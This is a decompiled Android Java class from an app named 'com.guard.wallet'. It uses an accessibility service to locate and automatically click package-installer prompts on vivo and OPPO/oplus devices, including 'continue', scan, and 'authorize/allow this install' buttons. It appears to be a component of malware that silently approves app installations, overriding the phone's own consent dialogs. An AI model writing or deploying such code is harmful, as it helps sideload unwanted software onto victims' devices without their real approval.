package o;

import android.util.Log;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFiltersWithOr;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.LinkedList;
import java.util.List;
import java.util.Objects;

// $VF: synthetic class
public final class w implements Runnable {
   public final int a;
   public final x b;

   @Override
   public final void run() {
      int var1 = this.a;
      x var4 = this.b;
      switch (var1) {
         case 0:
            var4.W();
            return;
         case 1:
            if (var4.I()) {
               Log.d("PackageInstallerDelegate", "vivo findCheckBoxAndClick Success");
               com.guard.wallet.utils.g.T0(25);
            }

            if (var4.J()) {
               Log.d("PackageInstallerDelegate", "vivo findContinueBtnAndClick Success");
               com.guard.wallet.utils.g.T0(10);
               var4.L();
            }

            var4.o.remove("commonInstallMatch");
            return;
         case 2:
            if (var4.I()) {
               Log.d("PackageInstallerDelegate", "findCheckBoxAndClick Success");
               com.guard.wallet.utils.g.T0(25);
            }

            if (var4.J()) {
               Log.d("PackageInstallerDelegate", "findContinueBtnAndClick Success");
            }

            var4.L();
            var4.o.remove("commonInstallMatch");
            return;
         case 3:
            if (var4.J()) {
               Log.d("PackageInstallerDelegate", "dialogInstallMatch findContinueBtnAndClick Success");
            }

            var4.L();
            return;
         case 4:
            if (var4.J()) {
               Log.d("PackageInstallerDelegate", "dialogInstallMatch findContinueBtnAndClick Success");
            }

            var4.L();
            return;
         case 5:
            boolean var2;
            label117: {
               UiObject var5 = var4.k();
               var2 = true;
               if (var5 != null) {
                  MyAccessibilityService.I(var4.k());
                  var5 = var4.k();
                  CombineFiltersWithOr var6 = new CombineFiltersWithOr();
                  var6.setFilters(new LinkedList<>());
                  List var9 = var6.getFilters();
                  CombineFilter var8 = new CombineFilter();
                  var8.setStringConditions(new LinkedList<>());
                  StringCondition var7 = new StringCondition();
                  var7.setProperty("text");
                  var7.setPrefix(com.guard.wallet.utils.f.b("OPPO_PREPARE_INSTALL_TEXT"));
                  var8.getStringConditions().add(var7);
                  var9.add(var8);
                  List var18 = var6.getFilters();
                  var8 = new CombineFilter();
                  var8.setStringConditions(new LinkedList<>());
                  StringCondition var23 = new StringCondition();
                  var23.setProperty("text");
                  var23.setPrefix(com.guard.wallet.utils.f.b("OPPO_PARSE_APP_TEXT"));
                  var8.getStringConditions().add(var23);
                  var18.add(var8);
                  var9 = var6.getFilters();
                  var8 = new CombineFilter();
                  var8.setStringConditions(new LinkedList<>());
                  var7 = new StringCondition();
                  var7.setProperty("text");
                  var7.setPrefix(com.guard.wallet.utils.f.b("OPPO_SCAN_APP_TEXT"));
                  var8.getStringConditions().add(var7);
                  var9.add(var8);
                  if (var5.findOneByOperateOr(var6) != null) {
                     Log.d("PackageInstallerDelegate", "准备安装节点查找成功");
                     var10 = true;
                     break label117;
                  }
               }

               var10 = false;
            }

            String var12;
            if (var10) {
               var12 = "oplusInstallMatch isPrepareInstall Success";
            } else if (var4.O()) {
               var12 = "oplusInstallMatch isInstalling Success";
            } else {
               com.guard.wallet.utils.g.T0(10);
               if (var4.I()) {
                  Log.d("PackageInstallerDelegate", "oplusInstallMatch findCheckBoxAndClick Success");
               }

               boolean var3;
               label107: {
                  if (var4.k() != null) {
                     Log.d("PackageInstallerDelegate", "开始查找授权安装按钮");
                     MyAccessibilityService.I(var4.k());
                     UiObject var14 = var4.k().findOneByOperateOr(x.M());
                     if (var14 != null) {
                        Log.d("PackageInstallerDelegate", "授权安装查找成功");
                        if (var14.text().endsWith("授权本次安装") && !Objects.equals(var14.text(), "授权本次安装")) {
                           Log.d("PackageInstallerDelegate", "授权本次安装查找成功");
                           var3 = var14.clickPosition(0.8F, 0.5F);
                           break label107;
                        }

                        if (var14.text().endsWith("允许本次安装") && !Objects.equals(var14.text(), "允许本次安装")) {
                           Log.d("PackageInstallerDelegate", "允许本次安装查找成功");
                           var3 = var14.clickPosition(0.8F, 0.8F);
                           break label107;
                        }

                        if (var14.enabled() && var14.click()) {
                           var3 = true;
                           break label107;
                        }
                     }
                  }

                  var3 = false;
               }

               if (var3) {
                  var12 = "oplusInstallMatch findOplusInstallBtnAndClick Success";
               } else {
                  label93: {
                     if (var4.k() != null) {
                        Log.d("PackageInstallerDelegate", "开始查找扫描按钮");
                        MyAccessibilityService.I(var4.k());
                        UiObject var15 = var4.k();
                        CombineFilter var17 = new CombineFilter();
                        StringCondition var20 = a.a.c(var17, "id", "com.oplus.appdetail:id/tv_scan_tips");
                        var17.getStringConditions().add(var20);
                        var15 = var15.findOneByCombine(var17);
                        if (var15 != null && var15.click()) {
                           Log.d("PackageInstallerDelegate", "扫描按钮点击完成");
                           var11 = var2;
                           break label93;
                        }
                     }

                     var11 = false;
                  }

                  if (!var11) {
                     if (var4.K()) {
                        Log.d("PackageInstallerDelegate", "oplusInstallMatch findOplusDoneBtnAndClick Success");
                     }

                     var4.L();
                     return;
                  }

                  var12 = "oplusInstallMatch findOplusRegionInstallAndClick Success";
               }
            }

            Log.d("PackageInstallerDelegate", var12);
            return;
         default:
            if (var4.O()) {
               Log.d("PackageInstallerDelegate", "oplusInstallDoneMatch isInstalling Success");
            } else {
               if (var4.K()) {
                  Log.d("PackageInstallerDelegate", "oplusInstallDoneMatch findOplusDoneBtnAndClick Success");
               }

               var4.L();
            }
      }
   }
}
